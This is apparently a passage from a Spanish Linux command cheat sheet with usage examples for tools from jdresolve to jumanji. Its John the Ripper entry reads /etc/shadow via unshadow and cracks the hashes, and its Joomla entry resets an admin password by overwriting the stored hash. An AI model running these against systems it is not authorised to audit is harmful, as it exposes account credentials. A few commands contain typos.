$ jdresolve access.log.1 access.log.2 > all_resolved.log ((procesar múltiples archivos)
$ jdresolve -t 20 -n 8.8.8.8 access.log > resolved.log (usar 20 hilos, por defecto 30 y un servidor DNS específico)
$ jdresolve -s access.log > resolved.log (mostrar estadísticas al finalizar)
$ cat access.log | jdresolve > resolved.log (procesar desde la entrada estándar)


jdupes
Identificar, eliminar o vincular archivos duplicados en el sistema.
$ jdupes ~/* (encontrar duplicados en el directorio personal. Si no encuentra ninguno no muestra salida)
$ jdupes -N ~/* (si no encuentra duplicados, muestra un mensaje [No duplicate files found.])
$ jdupes -d ~/Documentos/ (preguntará qué copia se quiere conservar y cuál eliminar)
$ jdupes -rd Documentos/ Download/
$ jdupes -r ~/ (buscar recursivamente todos los duplicados en un directorio)
$ jdupes -r -L ~/ (crear enlaces físicos a cualquier archivo duplicado)
$ jdupes -r --delete --noprompt (eliminar todos los duplicados conservando el primero)
$ jdupes -L /tmp/jdupes_test/ (convertir duplicados en enlaces duros [hard links])
$ jdupes -s /tmp/jdupes_test/ (convertir duplicados en enlaces simbólicos relativos [soft links])
$ jdupes -X /tmp/jdupes_test/dir3 /tmp/jdupes_test/ (buscaría duplicados en /tmp/jdupes_test/ pero ignoraría /tmp/jdupes_test/dir3)
$ jdupes -f ~/Documentos (no mostrar la primera copia de cada conjunto de duplicados para ver los que se podrían eliminar o reemplazar)
$ jdupes -m /tmp/jdupes_test/ (muestra un resumen de los archivos duplicados encontrados, el espacio que ocupan, etc)


jed
[jed-extra]. Editor para programadores. Ctrl-x Ctrl-c para salir.
$ jed script.sh


jekyll
Script de ruby para transformar texto plano en páginas web estáticas y blogs.
# gem install jekyll (Instalar la gema)
$ jekyll new mi_sitio (crear el directorio del site)
$ cd mi_sitio (Entrar en el directorio creado)
$ jekyll build (Generar el site)
$ jekyl serve --watch (Acceder a la versión local del site en http://localhost:4000. El argumento --watch permite que si se realizan cambios en los archivos, éstos se puedan ver inmediatamente recargando la página del navegador)


jetring
Suite de herramientas diseñada para gestionar de forma segura y auditable los llaveros GPG [GNU Privacy Guard] utilizando un sistema de conjuntos de cambios. Esto es particularmente útil en entornos donde múltiples personas o sistemas necesitan contribuir a un llavero GPG, y donde la trazabilidad y la seguridad son primordiales. Incluye las herramientas jetring-accept, jetring-apply, jetring-build, jetring-checksum, jetring-diff, jetring-explode, jetring-gen, jetring-review y jetring-signindex.
Suponemos que se tiene un repositorio de software y se quiere que las firmas de los paquetes sean verificables por los usuarios. Para ello, se necesita un llavero GPG público que contenga las claves de todos los desarrolladores que firman los paquetes. jetring permite gestionar este llavero de forma colaborativa y segura.
Añadir una clave pública GPG al llavero.
$ gpg --export --armor <ID_DE_LA_CLAVE> > mi_clave_publica.asc
$ jetring-gen mi_anillo add mi_clave_publica.asc (creará un archivo en el directorio mi_anillo/in/ [por defecto] con un nombre como add-XXXXXXXX.jet con información para añadir la clave)
Después de que se han generado varios cambios en el directorio mi_anillo/in/, firmar el índice para que sea confiable.
$ jetring-signindex mi_anillo (creará un archivo de firma [index.sig] en el directorio mi_anillo/ que certifica el contenido del índice)
$ jetring-build mi_anillo mi_llavero_final.gpg (generará el archivo mi_llavero_final.gpg que contendrá todas las claves públicas resultantes de aplicar los cambios)
Supongamos que alguien ha enviado un cambio [.jet file] y se has colocado en mi_anillo/in/. Y se ha de revisar y luego aceptarlo.
$ jetring-accept mi_anillo <nombre_del_archivo_jet> (acepta el cambio)
$ jetring-accept mi_anillo --all (aceptar todos los cambios pendientes y moverá los archivos .jet al directorio mi_anillo/accepted/)
$ jetring-apply mi_anillo mi_llavero.gpg (actualizará mi_llavero.gpg con los cambios pendientes de aplicación sin reconstruirlo desde cero)
$ jetring-checksum mi_anillo (verificar las sumas de verificación de todos los cambios en un anillo y notificará si detecta alguna discrepancia)
$ jetring-diff mi_anillo mi_llavero_actual.gpg (mostrará una salida, indicando qué se añadiría [+] y qué se eliminaría [-] si se aplicaran los cambios pendientes)
$ jetring-explode llavero_antiguo.gpg mi_anillo_nuevo (descompone un llavero GPG existente en un conjunto de cambios individuales, uno por cada clave)
$ jetring-review mi_anillo (presentará cada cambio y preguntará qué acción tomar: aceptar, rechazar, etc.)


jfsutils
Utilidades para la gestión del sistema de archivos JFS de IBM en Linux. Consta de los ejecutables fsck.jfs, jfs_debugfs, jfs_fsck, jfs_fscklog, jfs_logdump, jfs_mkfs, jfs_tune y mkfs.jfs
# jfs_mkfs /dev/sdX1 (formatear una partición)
# jfs_mkfs -L MisDatos /dev/sdX1 (etiquetar el sistema de archivos)
# jfs_fsck -D myfsckdump.dat /dev/sdX1 (comprobar la integridad del sistema de archivos y reparar errores y volcar los resultados en el archivo)
# jfs_logdump /dev/sdX1 (extrae información del log de transacciones [journal] del sistema de archivos JFS)
# jfs_fscklog myfsckdump.dat (interpretar los dumps generados por fsck.jfs)
# jfs_debugfs /dev/sdX1 (examinar manualmente los datos en disco con interfaz CLI interactiva)


jgit-cli
[eclipse]. Biblioteca en Java que implementa el sistema de control de versiones de Git [ver]. Los argumentos son practicamente los mismos que git [jgit status, jgit log, jgit commit...]


jgraph
Permite crear gráficos simples, como gráficos de líneas o de dispersión a partir de una descripción en texto plano y genera un archivo PostScript en la salida estándar y se puede visualizar con herramientas que soporten PostScript, como gv o evince.
1.-
$ nano ejemplo.jgr
        newgraph
            xaxis min 0 max 10 label : Eje X
            yaxis min 0 max 100 label : Eje Y
            title : Linux es un sistema genial
            newcurve pts 1 10 2 40 3 30 4 80 5 50 6 40 7 90 linetype solid
$ jgraph ejemplo.jgr > salida.ps
$ gv salida.ps (visualizar el gráfico)
2.-
$ nano ejemplo2.jgr
        newgraph
            newcurve marktype box linetype solid label : Solid box
                 pts 0 0 1 1 2 1 3 1
            newcurve marktype circle linetype dotted label : Dotted circle
                 pts 0 1 1 2 2 2 3 2
            newcurve marktype x linetype dashed label : Dashed x
                 pts 0 2 1 3 2 3 3 3
               legend defaults
                 font Times-Italic fontsize 14 x 1.5 y 3.5 hjc vjb
$ jgraph ejemplo2.jgr > salida2.ps
$ gv salida2.ps
3.-
$ nano ejemplo3.jgr
        newgraph
            xaxis label : Tiempo
            yaxis label : Temperatura
            newcurve
                pts
                    1 20
                    2 22
                    3 23
                    4 24
                linetype solid
                color 1 0 0
            newcurve
                pts
                    1 18
                    2 19
                    3 20
                    4 22
                linetype dashed
                color 0 0 1
$ gv salida3.ps
Algunos significados
newgraph --> Comienza un nuevo gráfico.
xaxis --> minimo, maximo del eje de coordenadas "X" y etiqueta "Eje X"
yaxis --> minimo, maximo del eje de coordenadas "Y" y etiqueta "Eje Y"
newcurve --> Añade una serie de puntos.
pts --> Lista de coordenadas [x, y] para la curva.
linetype solid --> Linea solida uniendo los puntos.
marktype xbar --> Linea de altura de cada punto.
font Times-Italic fontsize 14 --> tipo de fuente y tamaño
x 1.5 y 3.5 hjc vjb --> justificación horizontal y vertical al centro [predeterminados horizontal centro y vertical abajo]
        hjl --> justificación horizontal a la izquierda
        hjr --> justificación horizontal a la derecha
        vjt --> justificación vertical a la parte superior encima del gráfico
        vjc --> justificación vertical a la parte inferior encima del gráfico
Varios ejemplos en file:///usr/share/doc/jgraph/examples. Se pueden ejecutar:
$ mkdir salidas
$ cd salidas
$ jgraph /usr/share/doc/jgraph/examples/acc.jgr > salida.ps (y visualizar con gv)


jhead
Utilidad para extraer la configuración de la cámara digital de los archivos con formato Exif utilizados por muchas cámaras digitales. También puede reducir el tamaño de los archivos JPEG de cámaras digitales sin pérdida de información, eliminando las miniaturas que las cámaras digitales incluyen en el encabezado Exif. Exif es un estándar que almacena metadatos dentro de archivos de imagen que incluye fecha y hora en que se tomó la foto, marca y modelo de la cámara, orientación, datos de GPS si están disponibles, miniaturas embebidas...
$ jhead foto.jpg (ver los metadatos Exif de una imagen)
$ jhead -dt foto.jpg (eliminar la miniatura incrustada)
$ jhead -autorot *.jpg (corregir orientación de la imagen según el valor Exif)
$ jhead -n%Y-%m-%d_%H-%M-%S *.jpg (renombra las fotos usando el patrón de fecha y hora de la toma, por ejemplo: 2025-06-20_14-30-01.jpg)
$ jhead -purejpg foto.jpg (elimina todos los datos Exif y otros segmentos no esenciales)
$ jhead -mkexif imagen.jpg (borra algunos datos)
$ jhead -ft *.jpg (cambia la fecha del sistema del archivo para que coincida con la fecha de captura guardada en Exif)


jhove
[JSTOR/Harvard Object Validation Environment]. Herramienta de validación de objetos digitales que verifica la integridad y conformidad de archivos con sus formatos específicos. Los formatos actualmente compatibles son AIFF, ASCII, Bytestream, GIF, HTML, JPEG, JPEG 2000, PDF, TIFF, UTF-8, WAV y XML. Los documentos son analizados y comprobados por si estan bien formados, consistentes con los requisitos básicos del formato y válidos.
$ jhove -m PDF-hul -h xml documento.pdf (valida un archivo PDF, usando el módulo especificado y salida en formato xml)
$ jhove -m JPEG-hul imagen.jpg (validar una imagen JPEG)
$ jhove -l (listar módulos disponibles)
$ jhove -m TIFF-hul *.tif (procesa todos los archivos .tif en el directorio)
$ jhove -m WAV-hul audio.wav -h text (salida en texto plano)
$ jhove -m HTML-hul pagina.html (comprueba sintaxis, doctype y estructura para validar un html)
Si un archivo es corrupto, JHOVE reporta errores como "Invalid xref table".
Nota.-- No repara archivos, solo los valida.


jigdo-file
Descarguar imágenes ISO de CD/DVD/USB de Debian desde cualquier réplica [mirrors] de Debian. Incluye las herramientas jigdo-lite y jigdo-mirror
Primero que precisa descargar un archivo .jigdo desde https://cdimage.debian.org/
$ jigdo-lite archivo.jigdo (pide la URL base del espejo Debian o usar el predeterminado y empieza la descarga)
$ jigdo-lite --scan /var/cache/apt/archives debian-12.5.0-amd64-DVD-1.jigdo (escaneando un cache local)
$ jigdo-lite debian-12.5.0-amd64-DVD-1.jigdo (descargar imágenes Debian desde un espejo)
$ jigdo-mirror --mirror /srv/debian-mirror/ --jigdo debian-12.5.0-amd64-DVD-1.jigdo (construir imágen completa desde un mirror local)


jigit
El paquete jigit complementa a jigdo [ver] y está orientado a usuarios avanzados, desarrolladores de distribuciones y mantenedores de mirrors. Sus utilidades permiten crear, verificar y manipular imágenes ISO relacionadas con .jigdo, especialmente enfocadas en reproducibilidad y verificación. Incluye las aplicaciones jigdo-gen-checksum-list, jigdump, jigit-mkimage, jigsum, jigsum-sha256, parallel-sums y mkjigsnap.
$ jigdo-gen-checksum-list -e (mostrar ejemplos)
$ jigdo-gen-checksum-list -c sha256 /srv/debian/debian-12.11.0-amd64-netinst.iso (suma de verificación sha256 del archivo especificado en el formato que jigdo-file espera)
$ jigsum debian.iso (genera MD5 al estilo jigdo base64)
$ jigsum-sha256 debian.iso (genera suma SHA256 al estilo jigdo base64)
$ jigit-mkimage --jigdo debian-12.5.0-amd64-DVD-1.jigdo --template debian-12.5.0-amd64-DVD-1.template --checksum-list checksums.list --image debian-rebuild.iso (reconstruye una imagen ISO directamente desde un archivo .jigdo, .template y los paquetes necesarios)
$ jigdump debian-12.5.0-amd64-DVD-1.template (extrae y muestra información interna de archivos .template y .jigdo)
$ parallel-sums --md5 --sha256 /srv/debian/pool > sums.txt (genera ambas sumas [MD5 y SHA256] para todo el directorio)
$ jigdo-file make-template --image original.iso --jigdo new.jigdo --template new.template (crear la .jigdo y .template)
$ jigit-mkimage --jigdo new.jigdo --template new.template --checksum-list checksums.list --image rebuilt.iso (regenerar una ISO en otro equipo)


jigl
Script de Perl que genera una galería de fotos HTML estática a partir de uno o más directorios de imágenes GIF/JPG/PNG. Admite temas y mostrar comentarios e información EXIF de cada imagen.
$ jigl -uec -it Verano -iw 6 -uo -lo . (mostrar exif, título, los thumbnails del indice de 6 por linea [por defecto 5], imágenes y links a los originales de las imágenes del presente directorio)


jitterdebugger
Herramienta de medición de respuesta en tiempo real [Real-Time - RT] que mide la variabilidad en la latencia de respuesta de las CPUs y almacena todas las muestras para posprocesamiento. Inicia un hilo en cada CPU que programa un temporizador y mide el tiempo transcurrido desde que expira el temporizador hasta que el hilo que lo configuró se vuelve a ejecutar.
# jitterdebugger -v (Mostrar actualizaciones en vivo de las mediciones)
# jitterdebugger -D 10s (se ejecuta durante 10 segundos)
# jitterdebugger -D 20s -p 50 -i 10000 (durante 20 segundos, prioridad de los subprocesos de medición 50 [predete. 98, máximo] y tiempo de reposo entre cada medición [predete 1000 us]


jitterentropy-mgd
Demonio de RNG [Random Number Generator] que alimenta el pool de entropía del kernel de Linux [/dev/random] utilizando una fuente de entropía basada en jitter de temporización, una técnica de generación de números aleatorios basada en la variación en tiempos de ejecución de operaciones a nivel de CPU. La inicialización de /dev/random también garantiza que /dev/urandom se beneficie de la entropía, especialmente durante el arranque, cuando la entropía de Linux es baja, Jitter RNGd proporciona una fuente de entropía suficiente.
$ cat /proc/sys/kernel/random/entropy_avail (saber la entropia del sistema. El valor máximo en muchos sistemas es 4096. Si baja de 1000, puede indicar que el sistema necesita más entropía)
# systemctl status jitterentropy-rngd
# jitterentropy-rngd -f 1 (se está activando un comportamiento opcional específico)
# jitterentropy-rngd -o 8 (configura el sobremuestreo a 8, que es un valor común)
# jitterentropy-rngd -s (activa el modo compatible con SP800-90B y jitterentropy-rngd se comporta de forma más conservadora y estricta)
# jitterentropy-rngd -v -f 1 -o 8 -s (modo verboso, usa un flag interno, sobremuestreo de 8 muestras por bit y activa el modo compatible con SP800-90B)


jlha-utils
Programa para comprimir o descomprimir archivos en formato lzh también conocido como lha.
$ jlha l archivo.lzh (ver qué archivos contiene un archivo .lzh sin descomprimirlo)
$ jlha v archivo.lzh (ver más detalles como tamaño, fecha, etc)
$ jlha x archivo.lzh (extraer todos los archivos del archivo LZH en el directorio actual)
$ jlha x archivo.lzh -w=carpeta_descomprimida (extraerlos en un directorio específico)
$ jlha a respaldo.lzh directorio/ (comprimir un directorio completo y su contenido)
$ jlha aq archivo.lzh archivo1.txt imagen.jpg (crear un archivo LZH que contenga archivo1.txt y imagen.jpg y en modo silencioso)
$ jlha xo archivo.lzh (extrae todos los archivos y sobrescribe archivos existentes sin preguntar en el directorio actual)
$ jlha az nuevo_archivo.lzh archivo_grande.bin (añade sin comprimir los archivos)


jmeter
Herramienta para realizar pruebas de carga y medición del rendimiento de aplicaciones web, servicios SOAP, API RESTful, etc. Incluye la herramienta jmeter-server.
$ jmeter -n -t test.jmx -l resut.jtl (ejecuta un script de prueba definido en test.jmx y registra los resultados en result.jtl)
$ jmeter-server (iniciar el servidor [igual a jmeter -s])
$ jmeter -n -f /ruta/a/test_plan.jmx (ejecuta un test plan específico definido en /ruta/a/test_plan.jmx)


jnettop
Monitor del tráfico de red ordenado por el ancho de banda utilizado.
# jnettop


jnoise
Utilidad que genera ruido blanco, un tipo de ruido tiene una potencia constante por unidad de frecuencia y rosa que tiene una potencia constante por octava. Ambas fuentes de ruido tienen una distribución de amplitud gaussiana y emiten una señal de -20 dB RMS [Root Mean Square], una onda sinusoidal de escala completa. Esto significa que la intensidad del ruido es consistente y controlada, lo que es importante para la calibración y el análisis.
$ jackd -d alsa -d hw:0 (iniciar el servidor JACK si no está ya en ejecución o a través de una interfaz gráfica como qjackctl)
$ jnoise


jobs
Informa sobre los trabajos en ejecución pendientes de finalización que se encuentran en backgroud.
$ jobs (uso básico)
$ jobs -l (Mostrar también el ID)
$ jobs -p (Mostrar sólo el ID)
Algunas opciones:
	-r (Mostrar sólo las que están procesandose)
	-s (Sólo las que están paradas)


jodconverter
Conversor de formatos de Office. Utiliza OpenOffice.org para proporcionar filtros de importación y exportación para diversos formatos de Office, como OpenDocument y Microsoft Office [DOC, DOCX, XLS, XLSX, PPT, PPTX, ODT, ODS, ODP, etc.].
$ jodconverter documento.docx documento.pdf (convierte documento.docx a PDF usando LibreOffice/OpenOffice en segundo plano)
$ jodconverter informe.xlsx informe.odt (convertir a formato ODT)
$ jodconverter --port 8100 (iniciar el servicio en modo servidor, por defecto en puerto 8100)
$ jodconverter --server http://localhost:8100 presentacion.ppt presentacion.pdf (enviar un documento para conversión remota)
$ jodconverter *.docx --output-dir pdfs --target-format pdf (convierte todos los archivos DOCX en el directorio actual a PDF y los guarda en la carpeta pdfs)
$ jodconverter --format pdf contrato.odt (especificar formato de salida con extensión)


joe
[Joe's Own Editor]. Editor de texto.
$ joe -linums fichero (Abre fichero numerando las lineas)
Algunas teclas de control ["^k h" significa pulsar la tecla Ctrl y sin soltarla pulsar la letra “k”, soltar estas teclas y pulsar “h”]
	^k h (Abrir/cerrar ventana de ayuda. Con esc . se avanza en las ventanas de ayuda y con esc , se retrocede)
	^k d (Guardar archivo sin salir)
	^k x (Guardar y salir)
	^c (Salir sin guardar)
	^k f (Buscar palabra)
	^u (Pantalla anterior)
	^v (Pantalla siguiente)
	^a (Ir al principio de linea)
	`e (Ir al final de la linea)
	^k u (Ir al principio del documento)
	^k v (Ir al final del documento)
	^d (Borrar caracter)
	^y (Borrar linea)
	^w (Borrar palabra siguiente)
	^o (Borrar palabra anterior)
	^_ (Deshacer)
	^c (Cancelar)
JOE se puede invocar con diferentes nombres para emular otros editores populares:
jstar --> Imitación cercana de WordStar.
jpico --> Imitación del editor PICO.
jmacs --> Imitación de GNU Emacs.
rjoe --> Versión restringida de JOE que permite editar solo los archivos especificados en la línea de comandos.


john
Herramienta que permite averiguar contraseñas encriptadas
El de los repositorios acostumbra a estar capado. Descargar el programa y el parche de:
$ wget http://www.openwall.com/john/g/john-1.7.3.4.tar.gz
$ wget http://openwall.info/wiki/_media/john/john-1.7.3.1-generic-crypt-1.diff.gz
Descomprimir:
# tar xvzf john-1.7.3.4.tar.gz
Entrar al directorio del programa:
# cd john-1.7.3.4
Aplicar el parche:
# gzip -dc ../john-1.7.3.1-generic-crypt-1.diff.gz | patch -p1
  patching file src/Makefile
  patching file src/crypt_fmt.c
  patching file src/john.c
  Hunk #2 succeeded at 67 (offset 2 lines).
El directorio donde se encuentra el código fuente es src:
# cd src
# make
Con make obtendrá una lista de los sistemas soportados, luego:
# make linux-x86-64
Si el sistema no esta en la lista:
# make clean generic
Pruebas de detección de correcto funcionamiento.
# cd ../run
# ./john --test
El fichero john.pot contiene los resultados encontrados por john. Si el fichero no está vacío significa que john ha encontrado la contraseña. El fichero john.rec contiene el estado actual de la búsqueda por si se produce una interrupción y es utilizado por el programa para reanudar la búsqueda.
1.-
Comprobación de la fortaleza de nuestra constraseñas:
# unshadow /etc/passwd /etc/shadow > contraseñas.txt
# john contraseñas.txt
# john --single contraseñas.txt (usandolo el modo single)
# john --incremental contraseñas.txt (Usando el modo incremental)
# john --wordlist=diccionario.lst --rules contraseñas.txt (Usando un diccionario)
# john --show contraseñas.txt (Ver resultados)


join
Muestra lineas coincidentes
$ join fichero1 fichero2
$ join -v 1 fichero1 fichero2 (mostrar líneas de fichero1 que no existen en  fichero2)


jool-dkms
[jool-tools]. Paquete que contiene módulos del kernel para Jool, instalados usando DKMS [Dynamic Kernel Module Support]. Jool es una herramienta de traducción entre IPv4 e IPv6, similar a NAT, y se usa para facilitar la interoperabilidad entre redes IPv4 y IPv6, según una estrategia de traducción de direcciones IP configurable.
# modprobe jool (verificar que Jool está instalado)
# jool instance add "instancia1" --netfilter (crea una instancia llamada instancia1 usando Netfilter)
# jool nat64 add --pool6 64:ff9b::/96 (agregar un prefijo NAT64 estándar para traducir IPv6 a IPv4)
# jool instance display (verificar el estado)
# iptables -t nat -A PREROUTING -p tcp -d 64:ff9b::/96 -j JOOL --instance instancia1 (con tráfico IPv6 entrante y que se traduzca a IPv4)
# jool instance remove instancia1 (eliminar instancia)


joomla
Recuperar la clave para acceder al administrador.
Instalar webmin y desde el navegador: https://localhost:10000
En servidores -> Servidor BD MySQL clicar sobre la base de datos de joomla, editar la tabla jos_users i mostrar los datos id. Los usuarios estan numerados a partir del número 62. Editamos la fila del administrator admin (por ejemplo), borramos la clave y le ponemos esta:
	1c7a92ae351d4e21ebdfb897508f59d6
Guardar y entrar como administrator en nuestra web con el nombre de usuario: admin y la contraseña: holamundo
Luego volver a modificar la contraseña desde el panel de control de joomla.


jot
[athena-jot]. Mostrar secuencias de datos o datos aleatorios.
$ jot 5 (Mostrar del 1 al 5)
$ jot 5 20 (Mostrar 5 números consecutivos a partir del 20)
$ jot 7 20 30 (Mostrar 7 números entre el 20 y el 30)
$ jot 7 20.00 30.00 (Mostrar 7 números del 20 al 30 con 2 decimales)
$ jot -p2 7 20 30 (Lo mismo con el parámetro p)
$ jot - 20 30 2 (Omitiendo el parámetro de la cantidad de números [-] y del 20 al 30 saltando de 2 en 2)
$ jot -r 4 10000 99999 (4 números aleatorios entre los especificados)
$ jot -s " " -b "-x-" 20 (20 caracteres especificados [-b] separados por un espacio [-s])
$ jot -s "" -c 26 a (26 letras [-c] empezando por la A y sin espacio entre ellas)


journalctl
Sistema de registro [log] propio de systemd.
# journalctl (Leer el registro)
# journalctl -b (logs desde el último arranque)
# journalctl -n (muestra los últimos 10)
# journalctl -n 20 (muestra los últimos 20=
# journalctl -b -0 (Muestra los mensajes del arranque actual)
# journalctl -b -1 (Muestra los mensajes del arranque anterior)
# journalctl -b -2 (Muestra los mensajes desde los dos últimos arranques)
# journalctl --list-boots (Muestra los últimos arranques guardados por el sistema. Si el sistema no guarda los registros de arranque hay que editar el fichero /etc/systemd/journald.conf y añadir/editar la línea Storage=persistent dentro de la sección [Journal])
# journalctl -b 27487d1e4b1241df93a55949aef01161 (También se puede consultar los mensajes de un arranque en concreto poniendo el identificador que aparece con --list-boots)
# journalctl -f (Seguir los mensajes nuevos)
# journalctl -u sshd -f (seguir logs en tiempo real de un servicio concreto
# journalcrl -k (registro de mensajes del kernel desde el último inicio)
# journalctl -p crit (ver los registros según su prioridad crítica)
# journalctl _PID=1 (Mostrar mensajes por su PID)
# journalctl -u sshd (Mostrar mensajes de una unidad especifica)
# journalctl --since yesterday (Muestra los mensajes des de el día de ayer. Los de hoy "today")
# journalctl --since "2016-09-13" (Muestra los mensajes des de el día especificado en el formato YYYY-MM-DD)
# journalctl --list-boots (muestra el historial de reinicios)
1.-
Hacer que el demonio syslog funcione con journal
# systemctl enable syslog-ng


jove
Editor de texto compacto y potente, similar al de Emacs. Ofrece las combinaciones de teclas habituales de Emacs, junto con una amplia gama de las funciones avanzadas más populares como ventanas de shell interactivas, compilación y modos específicos del lenguaje, a la vez que cumple con requisitos de CPU, memoria y disco comparables a los de vi.
$ teachjove (arranca un tutorial para aprender a usar el editor JOVE dentro del editor)
$ jove (entra en el editor)


jp2a
Convertir imagenes jpeg a ascii.
$ jp2a imagen.jpg (forma básica)
$ jp2a imagen1.jpg imagen2.jpg imagen3.jpg (convertir varias imágenes)
$ jp2a imagen.jpg --output=imagen_ascii (redirigir la salida a un archivo)
$ jp2a --background=light -b --colors imagen.jpg  (Sin fondo, con borde y color)
$ jp2a --color --html --fill --html-title=Imagen --background=dark entrada.jpg –output=salida.html (con un html de salida lcon título)
$ jp2a --html-no-bold URL/imagen.jpg  (Con una URL de entrada y sin caracteres en negrita)
$ jp2a --height=30 imagen.jpg (con una altura de 30 filas)
$ jp2a --weight=30 imagen.jpg (con una anchura de 30 filas)
$ jp2a --height=30 --width=50 imagen.jpg (con una altura de 30 y una anchura de 50)
$ jp2a --size=50x30 --border imagen.jpg (con borde)
$ jp2a --background=dark imagen.jpg (con fondo oscuro)
$ jp2a --background=light imagen.jpg (con fondo claro)


jpeginfo
Información y test de integridad de imagenes jpeg.
$ jpeginfo -c imagen.jpeg (comprobar el archivo en busca de errores)
$ jpeginfo -5 imagen.jpeg (Muestra el md5 de la imagen)
$ jpeginfo -i -v imagen.jpeg (maxima información de archivo especificado)


jpegjudge
Determina la calidad de un jpeg en una escala de 0 [menor] a 1000 [mayor calidad]
$ jpegjudga -b imagen.jpeg (Mostrar solo el número)
Nota.- Puede observarse el deterioro pasando un jpeg a png y volver a pasarlo a jpeg y comparar los resultados del primer jpeg y el último.


jpegoptim
Optimizar archivos .jpeg. Por defecto se sobreescriben los originales. Si no es posible la optimización no produce salida.
$ jpegoptim imagenes/*.jpg (Forma básica de todas las de un directorio)
$ jpegoptim imagen.jpg -d optimizado (Colocando la optimización en otro directorio)
$ jpegoptim -f imagen.jpg (Forzando optimización incluso si el resultado es más grande que el original)
$ jpegoptim -t imagen.jpeg (borrando los marcadores en el archivo de salida)


jpegpixi
[JPEG PIXel Interpolator]. Herramienta usada para corregir puntos defectuosos, también llamados "píxeles calientes" o "hot pixels" en imágenes JPEG producidas por cámaras digitales con defectos en el CCD. La mayoría de los programas de gráficos decodifican las imágenes JFIF al cargarlas y las recodifican al guardarlas, lo que resulta en una pérdida general de calidad. jpegpixi, por otro lado, no decodifica ni recodifica la imagen, sino que manipula los datos codificados. Al hacerlo, también conserva los metadatos EXIF.
Es preciso informar a la aplicación qué píxeles están defectuosos y en qué posición están. Esto se le pasa mediante un archivo de texto que contiene las coordenadas [x, y] de los píxeles a corregir. Luego, el programa reemplaza ese píxel por una interpolación de sus vecinos.
$ nano hotpixels.txt
        100 150 h
        200 250 v
        300 350 x
100 150 h --> píxel en columna 100, fila 150,  interpolar horizontalmente [entre píxeles izquierdo y derecho]
200 250 v --> interpolar verticalmente
300 350 x --> interpolar en ambas direcciones [promedio de horizontal y vertical]
$ jpegpixi foto_defecto.jpg foto_corregida.jpg hotpixels.txt (corregirá los píxeles listados y guardará la imagen corregida)
Nota.- Se pueden encontrar los píxeles calientes haciendo varias fotos oscuras, por ejemplo, con la tapa del lente puesta y analizando los puntos brillantes. Tambien hay programas gráficos  como darktable o herramientas como python3-opencv o python3-numpy para identificarlos automáticamente.


jpegqs
[JPEG Quant Smooth]. Herramienta diseñada para mejorar imágenes JPEG que presentan artefactos de compresión. Estos artefactos son comunes cuando una imagen JPEG ha sido comprimida de manera agresiva [calidad baja], lo que resulta en bloques visibles, pérdida de detalles y distorsiones en áreas con colores o texturas uniformes. Intenta recuperar la precisión perdida de los coeficientes DCT [Discrete Cosine Transform] basándose en una tabla de cuantificación de una imagen JPEG.
$ jpegqs imagen_original.jpg imagen_mejorada.jpg (corrección básica de una imagen JPEG)
$ jpegqs -q 80 imagen.jpg imagen_suavizada.jpg (ajustar la intensidad de la corrección. De 0 a 100, corrección más fuerte puede introducir suavizado excesivo)
$ jpegqs -f entrada.jpg salida.jpg (modo rápido, menos preciso)
$ jpegqs -m 1 foto.jpg foto_reparada.jpg (modo "suave", ideal cuando se quiere preservar detalles finos)
Nota.- Si la compresión original fue muy agresiva, la recuperación será limitada y en algunos casos, el filtrado excesivo puede hacer que la imagen parezca "borrosa".


jpegtran
Eliminar información y reducir, modificar o recortar tamaño de imagenes jpeg.
$ jpegtran -copy none optimize original.jpg resultado.jpg (Eliminando información oculta [-copy none] y reduciendo la imagen [-optimize])
Algunas opciones:
-grayscale (Forzar salida a escala de grises)
-rotate 90 (Rotar 90º)
-flip horizontal (Imagen espejo horizontal [izquierda-derecha])
-flip vertical (Imagen espejo vertical [arriba-abajo])


jpnevulator
Herramienta para analizar y manipular datos en puertos seriales. Funciona como un *sniffer* serial, permitiendo leer y escribir datos en uno o más dispositivos seriales al mismo tiempo. Es útil para depurar protocolos, probar dispositivos, o analizar tráfico serial en entornos de desarrollo o integración.
$ jpnevulator --read --tty /dev/ttyS0 (mostrará los datos recibidos en tiempo real, cada byte como dos dígitos hexadecimales, por ejemplo: DE AD BE EF, DEADBEEF o 0xDE 0xAD 0xBE 0xEF)
$ jpnevulator --write --tty /dev/ttyS0 < datos.txt (enviar datos al puerto /dev/ttyS0. Los datos datos son tipo: FF 00 AA ...)
$ echo "FF 00 AA" | jpnevulator --write --tty /dev/ttyS0 (enviar datos directamente desde la línea de comandos)
$ jpnevulator --read --tty /dev/ttyS0 --base 2 (especificar si los datos están en hexadecimal, base 16, por defecto o binario, base 2 [01000010 111,  01000010111 ...])
$ jpnevulator --pass --tty /dev/ttyS0 --tty /dev/ttyS1 (leer y escribir en múltiples puertos)


jsamp
Herramienta para el protocolo simple de mensajería de aplicaciones SAMP [Simple Application Messaging Protocol] para el Observatorio Virtual [Virtual Observatory - VO] que permite acceso directo a operaciones de bajo nivel, como iniciar un concentrador de comunicaciones SAMP local para que otras aplicaciones astronómicas como Aladin [ver imágenes en diferentes longitudes de onda], Topcat [analizar un catálogo de estrellas en esa galaxia] y Splat-VO [examinar el espectro de una estrella específica], se comuniquen entre sí y compartan datos de forma estandarizada. Con SAMP, se selecciona una estrella en Topcat, este puede enviar un mensaje a Aladin para que centre la imagen en esa estrella y a Splat-VO para que muestre su espectro. Esto agiliza enormemente el flujo de trabajo en la investigación astronómica.
$ java -jar jsamp.jar hub (iniciará un Hub SAMP en la máquina local)
$ java -jar jsamp.jar hubmonitor (permitirá supervisar el Hub)
$ java -jar jsamp.jar messagesender -mtype "table.load.votable" -url "file:///ruta/a/mi_catalogo.vot" -name "MiCatalogo" (enviaría un mensaje de tipo table.load.votable para cargar una tabla VOTable, con la URL de un archivo local a cualquier aplicación que esté suscrita a ese tipo de mensaje por ejemplo, Topcat)
$ java -jar jsamp.jar messagesender -mtype "image.load.url" -url "http://ejemplo.com/mi_imagen.fits" -targetname "Aladin" (enviar a un cliente específico [Aladin] que cargue la imagen FITS desde la URL especificada)
$ java -jar jsamp.jar snooper (mostrar los mensajes que se envían y reciben entre las aplicaciones conectadas)
$ java -jar jsamp.jar sampload -nclient 10 -nquery 100 -mode async (simular 10 clientes enviando 100 consultas asíncronas para evaluar el rendimiento del Hub)
$ topcat -jsamp hub (dice a TOPCAT que inicie un Hub SAMP usando su implementación jsamp interna)


jumanji
Navegador estilo vi con soporte flash.
Configuración:
$ nano .config/jumanji/jumanjirc
# jumanji configuration
# search engines
searchengine gg http://google.es
searchengine yo http://www.youtube.com/results?search_query=%s&aq=f
# browser settings
set homepage http://www.lapipaplena.com
set auto_save 60
set single_instance false
# downloads
set download_dir ~/downloads/
